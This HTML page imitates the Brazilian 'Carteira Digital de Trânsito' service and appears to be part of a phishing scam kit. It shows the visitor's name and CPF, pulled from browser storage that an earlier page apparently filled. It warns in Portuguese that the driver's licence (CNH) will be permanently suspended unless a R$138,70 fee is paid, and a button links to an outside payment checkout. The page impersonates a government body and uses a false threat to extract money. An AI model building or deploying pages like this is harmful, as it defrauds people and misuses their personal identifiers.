<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900&amp;display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="../css/app/bootstrap.css">
  <link rel="stylesheet" href="../css/app/app.css">
  <link rel="stylesheet" href="../css/pages/blue.css">
  <link rel="stylesheet" href="../../pro.fontawesome.com/releases/v5.10.0/css/all.css"
    integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
  <link rel="icon" type="image/x-icon" href="../image/blue/favicon.png">

  <title>Carteira Digital de Trânsito</title>
</head>

<body>
  <header class="w-100 py-1 box-shadow px-3 ">
    <div class="max-w-1200 m-0-auto py-2 d-flex justify-content-between align-items-center">
      <img src="../image/blue/logo.png" alt="" width="110px">

      <div class="font-size-14 text-dark font-weight-500 d-none d-lg-flex justify-content-between">
        <div>
          <i class="fas fa-adjust text-blue mr-2"></i> Alto Contraste
        </div>
        <div class="ml-5">
          <i class="fas fa-assistive-listening-systems text-blue mr-2"></i> VLibra
        </div>
      </div>
    </div>
  </header>

  <main class="px-3">
    <section class="w-100 py-1">
      <div class="max-w-1200 m-0-auto mt-3 py-2 d-flex justify-content-center">
        <div class="d-flex flex-column box-shadow p-4 rounded text-dark w-100" style="max-width:420px;">
          <p class="px-3 py-2 bg-danger text-white text-center font-size-14">
            <i class="fas fa-exclamation-triangle"></i>
            IMPORTANTE: O não pagamento da taxa até o prazo determinado,
            ocasionará na <strong>SUSPENSÃO DEFINITIVA</strong>
            da sua CNH.
          </p>

          <div class="w-100 text-dark font-weight-700 font-size-16 mb-1 d-flex justify-content-between">
            <span>Nome: </span>
            <span id="nome">Nome não disponível</span>
          </div>

          <div class="w-100 text-dark font-weight-700 font-size-16 mb-3 d-flex justify-content-between">
            <span>CPF: </span>
            <span id="cpf">CPF não disponível</span>
          </div>

          <div class="w-100 text-dark font-weight-700 font-size-16 mb-4 d-flex justify-content-between">
            <span>TAXA: </span>
            <span>R$138,70</span>
          </div>

          <!-- Botão simples para redirecionar -->
          <div class="w-100 px-0 d-flex justify-content-end">
            <a href="https://pay.risepay.com.br/Pay/0d448d8831e64237a1cdbd9ba1948067" class="btn-cta mt-3" target="_blank" rel="noopener noreferrer">
              Gerar Pagamento
            </a>
          </div>
        </div>
      </div>
    </section>
  </main>

  <footer></footer>

  <script>
    // Preenchendo os dados da página com informações armazenadas
    window.onload = function () {
      const userData = JSON.parse(localStorage.getItem('userData'));
      if (userData) {
        document.getElementById('nome').innerText = userData.nome || 'Nome não disponível';
        document.getElementById('cpf').innerText = userData.cpf || 'CPF não disponível';
      } else {
        alert("Nenhum dado encontrado. Retorne à página anterior.");
        window.location.href = "../entrar.html";
      }
    };
  </script>
</body>

</html>
